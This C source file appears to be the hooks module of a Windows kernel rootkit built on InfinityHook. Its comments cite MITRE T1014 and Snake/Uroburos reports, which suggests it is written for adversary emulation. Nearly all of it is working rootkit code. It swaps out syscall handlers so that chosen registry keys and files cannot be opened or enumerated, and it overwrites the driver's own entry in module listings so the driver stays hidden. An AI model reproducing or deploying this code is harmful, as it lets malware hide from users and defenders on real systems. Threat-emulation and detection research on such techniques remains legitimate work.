#include "stdafx.h"
#include "hooks.h"
#include "driver.h"
#include "..\libinfinityhook\ntint.h"

// Used to store actual syscall functions
static NtOpenKey_t           OrigNtOpenKey   = NULL;
static NtOpenKeyEx_t         OrigNtOpenKeyEx = NULL;
static NtCreateKey_t         OrigNtCreateKey = NULL;
static NtQueryKey_t          OrigNtQueryKey  = NULL;
static NtEnumerateKey_t      OrigNtEnumerateKey = NULL;
static NtEnumerateValueKey_t OrigNtEnumerateValueKey = NULL;
static NtCreateFile_t        OrigNtCreateFile = NULL;
static NtOpenFile_t          OrigNtOpenFile = NULL;
static NtQuerySystemInformation_t OrigNtQuerySystemInformation = NULL;

/*
 * SyscallStub:
 *      About:
 *          This is our syscall callback function, passed into InfinityHook and called every time a user-mode syscall is made.
 *          Currently leaving this logic inline to insure that syscalls are completed as quickly as possible, but I'm open to changes.
 *      Result:
 *          Used to hook various functions.
 *      MITRE ATT&CK Techniques:
 *          T1014: Rootkit
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 *          https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 *          https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg
 */
void __fastcall SyscallStub(
	_In_ unsigned int SystemCallIndex,
	_Inout_ void** SystemCallFunction)
{
    // We will use the syscall index #'s, because many of the nt* functions are not exported
    //      meaning MmGetSystemRoutineAddress would sometimes fail
	if (SystemCallIndex == NTOPENKEY) {
        if (OrigNtOpenKey == NULL) {
            // record the function pointer if we haven't seen it before
            OrigNtOpenKey = (NtOpenKey_t)*SystemCallFunction;
            kprintf("Located NtOpenKey: %p\n", OrigNtOpenKey);
        }
        // Call our detour function instead of the real version
		*SystemCallFunction = (PVOID)DetourNtOpenKey;
	}
    else if (SystemCallIndex == NTOPENKEYEX) {
        if (OrigNtOpenKeyEx == NULL) {
            OrigNtOpenKeyEx = (NtOpenKeyEx_t)*SystemCallFunction;
            kprintf("Located NtOpenKeyEx: %p\n", OrigNtOpenKeyEx);
        }
        *SystemCallFunction = (PVOID)DetourNtOpenKeyEx;
    }
    else if (SystemCallIndex == NTCREATEKEY) {
        if (OrigNtCreateKey == NULL) {
            OrigNtCreateKey = (NtCreateKey_t)*SystemCallFunction;
            kprintf("Located NtCreateKey: %p\n", OrigNtCreateKey);
        }
        *SystemCallFunction = (PVOID)DetourNtCreateKey;
    }
    else if (SystemCallIndex == NTENUMERATEKEY) {
        if (OrigNtEnumerateKey == NULL) {
            OrigNtEnumerateKey = (NtEnumerateKey_t)*SystemCallFunction;
            kprintf("Located NtEnumerateKey: %p\n", OrigNtEnumerateKey);
        }
        *SystemCallFunction = (PVOID)DetourNtEnumerateKey;
    }
    else if (SystemCallIndex == NTENUMERATEVALUEKEY) {
        if (OrigNtEnumerateValueKey == NULL) {
            OrigNtEnumerateValueKey = (NtEnumerateValueKey_t)*SystemCallFunction;
            kprintf("Located NtEnumerateValueKey: %p\n", OrigNtEnumerateValueKey);
        }
        *SystemCallFunction = (PVOID)DetourNtEnumerateValueKey;
    }
    else if (SystemCallIndex == NTCREATEFILE) {
        if (OrigNtCreateFile == NULL) {
            OrigNtCreateFile = (NtCreateFile_t)*SystemCallFunction;
            kprintf("Located NtCreateFile: %p\n", OrigNtCreateFile);
        }
        *SystemCallFunction = (PVOID)DetourNtCreateFile;
    }
    else if (SystemCallIndex == NTOPENFILE) {
        if (OrigNtOpenFile == NULL) {
            OrigNtOpenFile = (NtOpenFile_t)*SystemCallFunction;
            kprintf("Located NtOpenFile: %p\n", OrigNtOpenFile);
        }
        *SystemCallFunction = (PVOID)DetourNtOpenFile;
    }
    else if (SystemCallIndex == NTQUERYSYSTEMINFORMATION) {
        if (OrigNtQuerySystemInformation == NULL) {
            OrigNtQuerySystemInformation = (NtQuerySystemInformation_t)*SystemCallFunction;
            kprintf("Located NtQuerySystemInformation: %p\n", OrigNtQuerySystemInformation);
        }
        *SystemCallFunction = (PVOID)DetourNtQuerySystemInformation;
    }
}

static inline int doWstrCmp(wchar_t **list, int listLen, wchar_t *name, int strLen) {
    for (int i = 0; i < listLen; i++) {
        size_t curLen = wcslen(list[i]);
        if (strLen < curLen) {
            continue;
        }
        size_t idx = 0;
        // If we find our registry key, throw an error so that it is not included in enumerated list
        if (!_wcsnicmp(list[i], &(name[idx]), curLen)) {
            //kprintf("%s: Found a match: %S == %S\n", __FUNCTION__, list[i], name);
            return TRUE;
        }
    }
    return FALSE;
}


/*************************************************************************************************
 *************************************   DETOUR FUNCTIONS   **************************************/
// These are the functions that will get called instead of the real syscall function.
// Ex: DetourNtOpenKey -> NtOpenKey

// NtOpenKey hook enables us to block all access to our registry key(s)
NTSTATUS DetourNtOpenKey(
    OUT PHANDLE            KeyHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes ) 
{
    if (ObjectAttributes &&
		ObjectAttributes->ObjectName && 
		ObjectAttributes->ObjectName->Buffer)
	{
        if (doWstrCmp(gRegKeysFullPath, NUM_REGKEYS_FULLPATH, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length) == TRUE) {
            kprintf("%s: Denying access to key: %wZ.\n", __FUNCTION__, ObjectAttributes->ObjectName);
            return STATUS_NOT_FOUND;
        }
	}
    // call the real NtOpenKey
    return OrigNtOpenKey(KeyHandle, DesiredAccess, ObjectAttributes);
}

// NtOpenKeyEx hook used for the same purpose as NtOpenKey
NTSTATUS DetourNtOpenKeyEx(
    OUT PHANDLE            KeyHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    IN  ULONG              OpenOptions ) {

    if (ObjectAttributes &&
        ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer)
    {
        if (doWstrCmp(gRegKeysFullPath, NUM_REGKEYS_FULLPATH, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length) == TRUE) {
            kprintf("%s: Denying access to key: %wZ.\n", __FUNCTION__, ObjectAttributes->ObjectName);
            return STATUS_NOT_FOUND;
        }
    }
    return OrigNtOpenKeyEx(KeyHandle, DesiredAccess, ObjectAttributes, OpenOptions);
}

// Same purpose as NtOpenKey and NtOpenKeyEx
NTSTATUS DetourNtCreateKey(
    OUT           PHANDLE            KeyHandle,
    IN            ACCESS_MASK        DesiredAccess,
    IN            POBJECT_ATTRIBUTES ObjectAttributes,
                  ULONG              TitleIndex,
    IN            PUNICODE_STRING    Class,
    IN            ULONG              CreateOptions,
    OUT           PULONG             Disposition) {

    if (ObjectAttributes &&
        ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer)
    {
        if (doWstrCmp(gRegKeysFullPath, NUM_REGKEYS_FULLPATH, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length) == TRUE) {
            kprintf("%s: Denying access to key: %wZ.\n", __FUNCTION__, ObjectAttributes->ObjectName);
            return STATUS_NOT_FOUND;
        }
    }
    return OrigNtCreateKey(KeyHandle, DesiredAccess, ObjectAttributes, TitleIndex, Class, CreateOptions, Disposition);
}

// Currently unused but may be necessary later
NTSTATUS DetourNtQueryKey(
    HANDLE KeyHandle,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength) {
    
    return OrigNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
}

// NtEnumerateKey hook is what stops our registry keys from showing up in tools like regedit
NTSTATUS NTAPI DetourNtEnumerateKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_INFORMATION_CLASS KeyInformationClass,
    _Out_writes_bytes_to_opt_(Length, *ResultLength) PVOID KeyInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength
) {

    NTSTATUS status = OrigNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
    if (status == STATUS_SUCCESS && KeyInformation != NULL) {
        ULONG  len = 0;
        PWCHAR name = NULL;
        // Not covered: KeyFullInformation - Doesn't include a key name, just a class name.
        //              KeyVirtualizationInformation - No key names involved
        //              KeyCachedInformation - No key names involved
        //              KeyFlagsInformation, KeyHandleTagsInformation, KeyTrustinformation, KeyLayerInformation, MaxKeyInfoClass - no defined types
        if (KeyInformationClass == KeyBasicInformation) {
            PKEY_BASIC_INFORMATION kbi = (PKEY_BASIC_INFORMATION)KeyInformation;
            len = kbi->NameLength;
            name = (kbi->Name);
        }
        else if (KeyInformationClass == KeyNodeInformation) {
            PKEY_NODE_INFORMATION kni = (PKEY_NODE_INFORMATION)KeyInformation;
            len = kni->NameLength;
            name = (kni->Name);
        }
        else if (KeyInformationClass == KeyNameInformation) {
            PKEY_NAME_INFORMATION kni = (PKEY_NAME_INFORMATION)KeyInformation;
            len = kni->NameLength;
            name = (kni->Name);
        }
        if (name != NULL) {
            if (doWstrCmp(gRegKeys, NUM_REGKEYS, name, len) == TRUE) {
                kprintf("Returning STATUS_INVALID_PARAMETER\n");
                return STATUS_INVALID_PARAMETER;
            }
        }
    }
    return status;
}

// This hook might not be needed now, but may be useful if we need to hide values within keys
NTSTATUS NTAPI DetourNtEnumerateValueKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_writes_bytes_to_opt_(Length, *ResultLength) PVOID KeyValueInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength
) {
    NTSTATUS status = OrigNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
    if (status == STATUS_SUCCESS && KeyValueInformation != NULL) {
        ULONG  len  = 0;
        PWCHAR name = NULL;
        // TODO: Handle all KeyValueInformationclass types
        if (KeyValueInformationClass == KeyValueFullInformation) {
            PKEY_VALUE_FULL_INFORMATION kvfi = (PKEY_VALUE_FULL_INFORMATION)KeyValueInformation;
            len = kvfi->NameLength;
            name = kvfi->Name;
        }
        if (name != NULL) {
            if (doWstrCmp(gRegKeys, NUM_REGKEYS, name, len) == TRUE) {
                kprintf("Returning STATUS_INVALID_PARAMETER\n");
                return STATUS_INVALID_PARAMETER;
            }
        }
    }
    return status;
}


/**************************************/
/* File access hooks */

NTSTATUS NTAPI DetourNtCreateFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER AllocationSize,
    _In_ ULONG FileAttributes,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
    _In_ ULONG EaLength
) {
    if (ObjectAttributes &&
        ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer)
    {
        // do a full path check
        if (doWstrCmp(gFilesFullPath, NUM_FILES, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length) == TRUE) {
            kprintf("%s: Denying access to file: %wZ.\n", __FUNCTION__, ObjectAttributes->ObjectName);
            return STATUS_ACCESS_DENIED;
        }

        // check without the path - if tools execute commands without full paths, this is what will insure denial
        PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
        if (ObjectName)
        {
            // Need to null-terminate the unicode string
            memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
            memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

            for (int i = 0; i < NUM_FILES_FULLPATH; i++) {
                // This is not a case-insensitive search
                if (wcsstr(ObjectName, gFilesFullPath[i]))
                {
                    kprintf("%s: Denying access to file: %wZ.\n", __FUNCTION__, ObjectAttributes->ObjectName);
                    ExFreePool(ObjectName);
                    return STATUS_ACCESS_DENIED;
                }
            }

            ExFreePool(ObjectName);
        }
    }
    return OrigNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

NTSTATUS NTAPI DetourNtOpenFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG ShareAccess,
    _In_ ULONG OpenOptions
) {
    if (ObjectAttributes &&
        ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer)
    {
        // do a full path check
        if (doWstrCmp(gFilesFullPath, NUM_FILES, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length) == TRUE) {
            kprintf("%s: Denying access to file: %wZ.\n", __FUNCTION__, ObjectAttributes->ObjectName);
            return STATUS_ACCESS_DENIED;
        }

        // check without the path - if tools execute commands without full paths, this is what will insure denial
        PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
        if (ObjectName)
        {
            // Need to null-terminate the unicode string
            memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
            memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

            for (int i = 0; i < NUM_FILES_FULLPATH; i++) {
                // This is not a case-insensitive search
                if (wcsstr(ObjectName, gFilesFullPath[i]))
                {
                    kprintf("%s: Denying access to file: %wZ.\n", __FUNCTION__, ObjectAttributes->ObjectName);
                    ExFreePool(ObjectName);
                    return STATUS_ACCESS_DENIED;
                }
            }
            ExFreePool(ObjectName);
        }
    }
    return OrigNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}

// NtQuerySystemInformation is used as the name implies, to gather system information
NTSTATUS NTAPI DetourNtQuerySystemInformation(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
) {
    NTSTATUS ntStatus = OrigNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    // SystemModuleInformation could reveal that our driver is loaded, so we need to hide that
    if (NT_SUCCESS(ntStatus) && SystemInformation) {
        if (SystemInformationClass == SystemModuleInformation) {
            PRTL_PROCESS_MODULES SystemModules = (PRTL_PROCESS_MODULES)SystemInformation;

            // We will cloak our module by overwriting its entry to look like another one
            // First module is always ntoskrnl.exe (at least historically always has been), so we'll use that for now
            PRTL_PROCESS_MODULE_INFORMATION srcPmi = &SystemModules->Modules[0];
            for (ULONG i = 0; i < SystemModules->NumberOfModules; ++i)
            {
                PRTL_PROCESS_MODULE_INFORMATION ModuleInformation = &SystemModules->Modules[i];
                if (!strncmp((PCHAR)&ModuleInformation->FullPathName[ModuleInformation->OffsetToFileName], SYSTEM_MODULE_NAME, strlen(SYSTEM_MODULE_NAME))) {
                    kprintf("%s: removing %s from SystemModuleInformation\n", __FUNCTION__, SYSTEM_MODULE_NAME);
                    RtlCopyMemory((PVOID)ModuleInformation, (PVOID)srcPmi, sizeof(RTL_PROCESS_MODULE_INFORMATION));
                }

            }
        }
        else if (SystemInformationClass == SystemHandleInformation) {
            kprintf("SystemHandleInformation Handler\n");
            // Currently unused, if we open any handles from user space, we can track them down by PID here and cloak them.
            
        }

    }
    
    return ntStatus;
}


